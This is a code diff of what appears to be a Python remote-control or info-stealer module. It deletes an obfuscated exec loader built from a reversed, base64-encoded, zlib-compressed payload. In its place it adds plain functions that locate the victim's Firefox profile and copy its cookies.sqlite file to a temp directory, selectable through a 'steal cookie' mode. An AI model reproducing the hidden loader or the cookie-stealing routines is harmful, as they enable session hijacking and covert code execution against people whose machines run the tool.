@@ -12,8 +12,66 @@ import base64
 import constants
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+def open_url(url):
+    try:
+        webbrowser.open(url)
+        return (0, 1)
+    except Exception as ex:
+        return (1, str(ex))
 
 
-exec((_)(b'==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'))
+def steal_cookie():
+    cookie_paths = {}
+
+    browsers = get_browsers()
+
+    if 'Firefox' in browsers:
+        try:
+            cookie_paths['Firefox'] = steal_firefox_cookies()
+        except Exception as ex:
+            cookie_paths['Firefox'] = (1, 'Error file is busy by browser.')
+
+    return cookie_paths
+
+
+def get_firefox_profile():
+    firefox_path = config.home_path + '.mozilla/firefox/'
+    profiles = []
+    if os.path.isdir(firefox_path):
+        for dirname in os.listdir(firefox_path):
+            if dirname.endswith('.default-esr') or dirname.endswith('.default-release'):
+                profile_path = firefox_path + dirname
+                if os.path.isdir(profile_path):
+                    profiles.append(profile_path)
+    return profiles[0] if profiles else None
+
+
+def steal_firefox_cookies():
+    tmp_cookie_firefox_path = config.tmp_dir_path + 'Firefox cookie.sqlite'
+    profile_path = get_firefox_profile()
+    if not profile_path:
+        return (1, "Firefox profile not found")
+
+    src_cookies = os.path.join(profile_path, 'cookies.sqlite')
+    try:
+        shutil.copy2(src_cookies, tmp_cookie_firefox_path)
+        return (0, tmp_cookie_firefox_path)
+    except Exception as ex:
+        return (1, f"Error copying cookies: {str(ex)}")
+
+
+def delete_tmp_cookies():
+    tmp_cookie_firefox_path = config.tmp_dir_path + 'Firefox cookie.sqlite'
+    if os.path.isfile(tmp_cookie_firefox_path):
+        os.remove(tmp_cookie_firefox_path)
+
+
+def get_browsers():
+    browsers = []
+    if get_firefox_profile():
+        browsers.append("Firefox")
+    return browsers
+
+
+modes = {constants.BROWSER_OPENURL_preview: constants.BROWSER_OPENURL,
+         constants.BROWSER_STEALCOOKIE_preview: constants.BROWSER_STEALCOOKIE}
